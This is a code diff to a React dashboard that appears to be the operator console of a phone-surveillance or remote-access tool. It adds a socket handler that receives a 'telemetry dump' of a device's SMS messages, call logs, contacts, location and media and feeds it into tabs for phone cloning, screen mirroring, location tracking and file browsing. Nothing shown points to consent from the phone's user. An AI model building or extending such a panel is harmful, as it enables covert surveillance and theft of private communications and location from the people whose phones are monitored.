@@ -20,6 +20,13 @@ function Dashboard({ token, onLogout }) {
   const [devices, setDevices] = useState(MOCK_DEVICES);
   const [activeDevice, setActiveDevice] = useState(MOCK_DEVICES[0]);
   const [liveConnected, setLiveConnected] = useState(false);
+  const [telemetry, setTelemetry] = useState({
+    smsList: [],
+    callLogs: [],
+    contacts: [],
+    location: null,
+    mediaList: []
+  });
 
   useEffect(() => {
     // 1. Fetch saved devices from backend API if available
@@ -68,9 +75,7 @@ function Dashboard({ token, onLogout }) {
         lastSeen: realData.lastSeen || 'Just now (Live)'
       };
 
-      // Replace ALL mock devices with only real devices
       setDevices((prevDevices) => {
-        // Filter out mock devices (IDs starting with 'dev_mock' or from MOCK_DEVICES)
         const realDevices = prevDevices.filter((d) => d.lastSeen && d.lastSeen.includes('Live'));
         const index = realDevices.findIndex((d) => d._id === liveDevice._id);
         if (index !== -1) {
@@ -82,8 +87,19 @@ function Dashboard({ token, onLogout }) {
         }
       });
 
-      // Always set the real live device as active
       setActiveDevice(liveDevice);
+    });
+
+    // Listen for full telemetry dump (SMS, Call Logs, Contacts, Location, Media)
+    socket.on('live_telemetry_dump', (dump) => {
+      console.log('Received full telemetry dump from device:', dump);
+      setTelemetry({
+        smsList: dump.smsList || [],
+        callLogs: dump.callLogs || [],
+        contacts: dump.contacts || [],
+        location: dump.location || null,
+        mediaList: dump.mediaList || []
+      });
     });
 
     return () => {
@@ -237,7 +253,7 @@ function Dashboard({ token, onLogout }) {
 
         <main className="main-content">
           {activeTab === 'clone' && (
-            <PhoneCloneView activeDevice={activeDevice} />
+            <PhoneCloneView activeDevice={activeDevice} telemetry={telemetry} />
           )}
           {activeTab === 'devices' && (
             <Devices
@@ -249,22 +265,22 @@ function Dashboard({ token, onLogout }) {
             />
           )}
           {activeTab === 'media' && (
-            <MediaViewer token={token} activeDevice={activeDevice} />
+            <MediaViewer token={token} activeDevice={activeDevice} liveMedia={telemetry.mediaList} />
           )}
           {activeTab === 'messages' && (
-            <MessagesViewer token={token} activeDevice={activeDevice} />
+            <MessagesViewer token={token} activeDevice={activeDevice} liveSms={telemetry.smsList} />
           )}
           {activeTab === 'calls' && (
-            <CallLogsViewer token={token} activeDevice={activeDevice} />
+            <CallLogsViewer token={token} activeDevice={activeDevice} liveCallLogs={telemetry.callLogs} />
           )}
           {activeTab === 'contacts' && (
-            <ContactsViewer token={token} activeDevice={activeDevice} />
+            <ContactsViewer token={token} activeDevice={activeDevice} liveContacts={telemetry.contacts} />
           )}
           {activeTab === 'screen' && (
             <ScreenMirror activeDevice={activeDevice} />
           )}
           {activeTab === 'location' && (
-            <LocationTracker token={token} activeDevice={activeDevice} />
+            <LocationTracker token={token} activeDevice={activeDevice} liveLocation={telemetry.location} />
           )}
           {activeTab === 'files' && (
             <FileManager token={token} activeDevice={activeDevice} />
